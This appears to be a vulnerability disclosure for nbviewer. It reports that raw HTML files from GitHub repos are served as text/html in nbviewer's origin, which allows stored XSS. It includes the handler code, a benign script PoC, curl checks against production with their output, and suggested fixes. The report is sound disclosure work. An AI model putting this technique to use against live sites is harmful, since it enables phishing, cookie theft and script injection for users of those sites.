# nbviewer: raw HTML files served as text/html in nbviewer origin — stored XSS via GitHub/Gist content

## Description

nbviewer serves non-notebook files (from GitHub repos and Gists) with a MIME type guessed from the filename:

```python
# providers/github/handlers.py L457-459 (Gist handler shares this path)
mime, enc = mimetypes.guess_type(path)
self.set_header("Content-Type", mime or "text/plain")
await self.cache_and_finish(filedata)
```

When a GitHub user places an `.html` file in a public repo, `mimetypes.guess_type("payload.html")` returns `text/html`, and nbviewer serves the raw file bytes with `Content-Type: text/html` in its own origin — the browser renders the attacker's HTML and executes any `<script>` tags.

The Content-Security-Policy on the production instance is `connect-src *` — it does **not** restrict `script-src`, so injected scripts can execute AND make network requests to any domain (data exfiltration, credential theft, API calls).

## Impact

Any GitHub user can execute arbitrary JavaScript in the `nbviewer.org` origin by placing an HTML file in a public repo and sharing the nbviewer URL. The attack:

- **Trusted-domain phishing**: `nbviewer.org` is a Jupyter project domain — victims trust links from it
- **Script execution**: no `script-src` CSP restriction; `<script>` tags execute freely
- **Network requests**: production CSP is `connect-src *` — scripts can fetch/XHR to any domain
- **Cookie/localStorage access**: `document.cookie`, `localStorage` accessible from nbviewer origin
- **DOM manipulation**: full page replacement (fake login overlays, content injection)

This affects both the public instance (nbviewer.org) and all self-hosted deployments.

## PoC

```bash
# 1. Create a GitHub repo with payload.html:
cat > payload.html << 'HTMLEOF'
<!DOCTYPE html>
<html>
<body style="background:#cc2222;color:white;padding:40px">
    <h1>XSS Proof of Concept</h1>
    <p>Current hostname: <b id="host">(checking...)</b></p>
    <script>
        document.getElementById('host').textContent = location.hostname;
        document.title = "PoC: XSS confirmed in " + location.hostname;
    </script>
</body>
</html>
HTMLEOF

# 2. Push to GitHub, then check the response:
curl -sI "https://nbviewer.org/github/<user>/<repo>/blob/main/payload.html" | \
    grep -i "content-type\|content-security"

# 3. Or open the URL in a browser — the script executes.
```

## Execution result (verified against production nbviewer.org, 2026-09-15)

```
$ curl -sI "https://nbviewer.org/github/REYu6/xss-poc-nbviewer/blob/main/payload.html"
HTTP/1.1 200 OK
Content-Type: text/html
Content-Security-Policy: connect-src *

$ curl -s "https://nbviewer.org/github/REYu6/xss-poc-nbviewer/blob/main/payload.html" | head -15
<!DOCTYPE html>
<html>
<body style="background:#cc2222;color:white;padding:40px;font-family:sans-serif">
    <h1>XSS Proof of Concept</h1>
    <p>If you see this styled page, HTML is rendered in nbviewer's origin.</p>
    <p>Current hostname: <b id="host">(checking...)</b></p>
    <script>
        document.getElementById('host').textContent = location.hostname;
        document.title = "PoC: XSS confirmed in " + location.hostname;
    </script>
</body>
</html>

# The raw HTML is served verbatim with Content-Type: text/html in nbviewer.org's origin.
# The <script> tags execute in the browser; CSP (connect-src *) does not prevent this.
# The PoC repo was deleted immediately after verification.
```

## Suggested fix

For non-notebook files, either:
1. Serve with `Content-Type: application/octet-stream` + `Content-Disposition: attachment` (download only), or
2. Serve with `Content-Type: text/plain` (prevent HTML rendering), or
3. Add `script-src 'none'` + `object-src 'none'` to the CSP for raw file responses, and/or
4. Add `X-Content-Type-Options: nosniff` to prevent MIME-type confusion
